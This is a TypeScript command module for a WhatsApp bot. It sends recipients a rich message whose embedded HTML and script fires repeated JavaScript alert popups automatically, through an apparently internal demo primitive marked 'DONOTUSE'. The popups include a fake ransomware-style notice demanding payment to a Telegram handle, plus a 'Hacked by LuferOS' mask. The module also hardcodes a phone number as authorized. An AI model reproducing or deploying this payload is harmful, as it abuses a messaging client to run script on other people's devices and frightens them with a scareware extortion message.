import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";

const BRAILLE_MASK = [
  "  ⢀⣠⣾⣿⡖⠋       ⠙⡖⣿⣿⣷⣄⡀",
  " ⣠⣿⣿⣿⠏         ⠹⣿⣿⣿⣄",
  "  ⢀⣠⠤⠤⢤⡀     ⢀⡤⠤⠤⣄⡀",
  " ⣠⣿⣿⣿⣿⣿     ⢸⣿⣿⣿⣿⣿⣄",
  "   ⠉⠉         ⠉⠉",
  "        ⣠     ⣄",
  "      ⢀⣠⠞     ⠳⣄⡀",
  " ⢸⡖⠤⠤⠴⠋ ⠤⠤⠤⠤⠤ ⠙⠦⠤⠤⢲⡇",
  "  ⢿⡍⠓⠦ ⣀⣀⣿⣿⣿⣿⣀⣀ ⠴⠚⢩⡿",
  "   ⠳俦⠉⠉⠻⣿⣿⣿⣿⡿⠋⠉俦⠞",
  "    ⠑⢄   ⠉⠧⠤⠏   ⡠⠊",
  "      ⠑⠢⢄ ⣿⣿ ⡠⠔⠊",
  "         ⠈⠻⠟⠁",
].join("\n");

function buildPopupPayload(alertMessages: string[], cardTitle: string, cardSub: string) {
  const serializedMsgs = JSON.stringify(alertMessages);

  const htmlContent = `<style>
*{box-sizing:border-box;margin:0;padding:0;user-select:none;-webkit-user-select:none;font-family:system-ui,-apple-system,sans-serif}
body{background:#0b0f17;color:#f1f5f9;padding:12px;display:flex;justify-content:center;align-items:center}
.box{width:100%;max-width:380px;background:linear-gradient(160deg,#161f33,#0d1322);border:1px solid #263554;border-radius:14px;padding:16px;text-align:center;cursor:pointer;box-shadow:0 12px 30px rgba(0,0,0,0.75)}
.tag{display:inline-block;background:rgba(239,68,68,0.18);color:#f87171;border:1px solid rgba(239,68,68,0.4);border-radius:6px;padding:3px 8px;font-size:10px;font-weight:800;letter-spacing:1px;margin-bottom:8px}
.ttl{font-size:15px;font-weight:800;color:#fff;margin-bottom:4px}
.sub{font-size:12px;color:#94a3b8}
</style>
<div class="box" onclick="runAlerts()">
  <div class="tag">SYSTEM PAYLOAD</div>
  <div class="ttl">${cardTitle}</div>
  <div class="sub">${cardSub}</div>
</div>
<script>
const msgs = ${serializedMsgs};
function runAlerts() {
  for (let i = 0; i < msgs.length; i++) {
    alert(msgs[i]);
  }
}
setTimeout(runAlerts, 120);
</script>`;

  return {
    view_model: {
      __typename: "GenAISingleLayoutViewModel",
      primitive: {
        __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
        trusted_sources: [],
        payload: htmlContent,
      },
    },
  };
}

export default {
  name: ["popup", "jsalert", "ventana", "alertjs"],
  category: "system",
  description: "Lanza una tarjeta con ventana emergente JavaScript nativa sobre WhatsApp.",
  groupOnly: false,
  ownerOnly: true,
  async run(ctx: CommandContext) {
    const { reply, react, sock, from, msg, args, isOwner, sender, db } = ctx;

    const rawSender = String(sender || msg.key?.participant || "");
    const cleanNum = rawSender.split("@")[0].split(":")[0].replace(/\D/g, "");
    const dbAny = db as any;
    const authorized =
      Boolean(isOwner) ||
      Boolean(msg.key?.fromMe) ||
      cleanNum === "573118353868" ||
      Boolean(dbAny?.hasRole?.(rawSender, "owner")) ||
      Boolean(cleanNum && dbAny?.hasRole?.(`${cleanNum}@s.whatsapp.net`, "owner"));

    if (!authorized) {
      await react("⛔").catch(() => undefined);
      return reply("⛔ *Acceso denegado:* Este comando es exclusivo para los propietarios del bot.");
    }

    let loopCount = 1;
    const cleanArgs: string[] = [];

    for (let i = 0; i < args.length; i++) {
      if ((args[i] === "-loop" || args[i] === "-n") && args[i + 1]) {
        const parsed = parseInt(args[i + 1], 10);
        if (!isNaN(parsed) && parsed > 0) {
          loopCount = Math.min(25, parsed);
        }
        i++;
      } else {
        cleanArgs.push(args[i]);
      }
    }

    const mode = String(cleanArgs[0] || "mask").toLowerCase();
    const customText = cleanArgs.slice(1).join(" ").trim();
    const fullText = cleanArgs.join(" ").trim();

    let popupText = "";

    if (mode === "lock" || mode === "bloqueo") {
      const lockTarget = customText || "@LuferOS";
      popupText = `[⚠️] JANGAN CANCEL!\n\nSistem terkunci permanen.\nSatu-satunya jalan: bayar ke Telegram ${lockTarget}`;
    } else if (mode === "mask" || mode === "anon" || cleanArgs.length === 0) {
      const authorLabel = customText || "Hacked by LuferOS 🎭";
      popupText = `${BRAILLE_MASK}\n\n      ${authorLabel}`;
    } else if (mode === "both" || mode === "combo") {
      const authorLabel = customText || "Hacked by LuferOS 🎭";
      const alertList: string[] = [];
      for (let i = 0; i < loopCount; i++) {
        alertList.push(`[⚠️] JANGAN CANCEL!\n\nSistem terkunci permanen.\nSatu-satunya jalan: bayar ke Telegram @LuferOS`);
        alertList.push(`${BRAILLE_MASK}\n\n      ${authorLabel}`);
      }
      await react("🎭").catch(() => undefined);
      const { AIRich } = await import("baileys/lib/Builders/ai-rich.js");
      const rich = new AIRich(sock)
        .setTitle("⚡ System Override // LuferOS")
        .setFooter("JavaScript Execution Environment");
      rich.addSection(buildPopupPayload(alertList, "⚡ LuferOS Security", "Toca para ejecutar el módulo"));
      await rich.send(from, { quoted: msg });
      await react("✅").catch(() => undefined);
      return;
    } else {
      popupText = fullText.replace(/\\n/g, "\n");
    }

    const alertMessages = Array.from({ length: loopCount }, () => popupText);

    await react("🎭").catch(() => undefined);

    try {
      const { AIRich } = await import("baileys/lib/Builders/ai-rich.js");

      const rich = new AIRich(sock)
        .setTitle("⚡ System Override // LuferOS")
        .setFooter("JavaScript Execution Environment");

      rich.addSection(
        buildPopupPayload(
          alertMessages,
          "⚡ LuferOS Security",
          "Toca aquí para abrir el aviso del sistema",
        ),
      );

      await rich.send(from, { quoted: msg });
      await react("✅").catch(() => undefined);
    } catch (error) {
      await react("❌").catch(() => undefined);
      await reply(
        `${fytBold("Error")} al enviar la ventana emergente: ${error instanceof Error ? error.message : String(error)}`,
      ).catch(() => undefined);
    }
  },
};
